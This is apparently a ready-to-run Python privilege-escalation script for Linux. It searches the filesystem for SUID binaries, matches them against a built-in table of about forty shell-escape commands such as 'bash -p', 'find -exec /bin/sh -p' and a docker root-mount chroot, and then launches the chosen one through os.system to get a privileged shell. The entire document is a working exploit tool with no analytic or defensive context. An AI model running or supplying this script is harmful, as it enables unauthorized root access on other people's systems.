/bin/python3 -c """
import subprocess, os
master = {'aa-exec': 'aa-exec /bin/sh -p',
'bash': 'bash -p',
'capsh': 'capsh --gid=0 --uid=0 --',
'choom': 'choom -n 0 -- /bin/sh -p',
'cpulimit': 'cpulimit -l 100 -f -- /bin/sh -p',
'dash': 'dash -p',
'distcc': 'distcc /bin/sh -p',
'docker': 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh',
'elvish': 'elvish',
'env': 'env /bin/sh -p',
'expect': 'expect -c \'spawn /bin/sh -p;interact\'',
'find': 'find . -exec /bin/sh -p \; -quit',
'fish': 'fish',
'flock': 'flock -u / /bin/sh -p',
'gtester': 'TF=$(mktemp);echo \'#\!/bin/sh\' > $TF;echo \'exec /bin/sh -p 0<&1\' >> $TF;chmod +x $TF;gtester -q $TF',
'ionice': 'ionice /bin/sh -p',
'logsave': 'logsave /dev/null /bin/sh -i -p',
'multitime': 'multitime /bin/sh -p',
'nice': 'nice /bin/sh -p',
'nohup': 'nohup /bin/sh -p -c \'sh -p <$(tty) >$(tty) 2>$(tty)\'',
'perf': 'perf stat /bin/sh -p',
'pexec': 'pexec /bin/sh -p',
'rlwrap': 'rlwrap -H /dev/null /bin/sh -p',
'run-parts': 'run-parts --new-session --regex \'^sh$\' /bin --arg=\'-p\'',
'sash': 'sash',
'setarch': 'setarch $(arch) /bin/sh -p',
'setlock': 'setlock - /bin/sh -p',
'softlimit': 'softlimit /bin/sh -p',
'ssh-agent': 'ssh-agent /bin/bash -p',
'sshpass': 'sshpass /bin/sh -p',
'start-stop-daemon': 'start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p',
'stdbuf': 'stdbuf -i0 /bin/sh -p',
'strace': 'strace -o /dev/null /bin/sh -p',
'taskset': 'taskset 1 /bin/sh -p',
'time': 'time /bin/sh -p',
'timeout': 'timeout 7d /bin/sh -p',
'unshare': 'unshare -r /bin/sh',
'vagrant': 'cd $(mktemp -d);echo \'exec \"/bin/sh -p\"\' > Vagrantfile;vagrant up',
'watch': 'watch -x sh -p -c \'reset; exec sh -p 1>&0 2>&0\'',
'wget': 'TF=$(mktemp);chmod +x $TF;echo -e \'#\!/bin/sh -p /bin/sh -p 1>&0\' >$TF;wget --use-askpass=$TF 0',
'xargs': 'xargs -a /dev/null sh -p',
'yash': 'yash',
'zsh': 'zsh'}
bins = subprocess.run(['find','/usr/bin','/usr/sbin','/opt', '/home/','-type','f','-perm','-4000'], stdout=subprocess.PIPE,text=True)
suid = bins.stdout.split()
suid = [x.split('/')[-1] for x in suid]
vulns = [x for x in suid if x in master.keys()]
print('\n\n\nFound vulnerable SUID Binaries: \n\n')
idx = 1
for vuln in vulns:
        print(str(idx) +') ' + vuln)
        idx += 1
print('\n\n0) Search For Binary\n\n\n')
choice = input('\nSelection: ')
if choice != '0':
	exploit = vulns[int(choice) -1]
else:
	choice2 = str.lower(input('\n\nSearch For Binary: '))
	if choice2 in master.keys():
		print('\n\nExploit ' + choice2 + ' by running:\n\n ' + master[choice2])
		choice3 = str.lower(input('\n\nExploit Y/N: '))
		if 'n' in choice3:
			print('\n\nSystem Exiting...')
			exit()
		elif 'y' in choice3:
			print('\n\nExploiting ' + choice2 + '\n\n')
			os.system(master[choice2])
			exit()	
	else:
		print('Invalid selection...Exiting')
		exit()

print('Exploiting ' + exploit)
os.system(master[exploit])
exit()     
"""
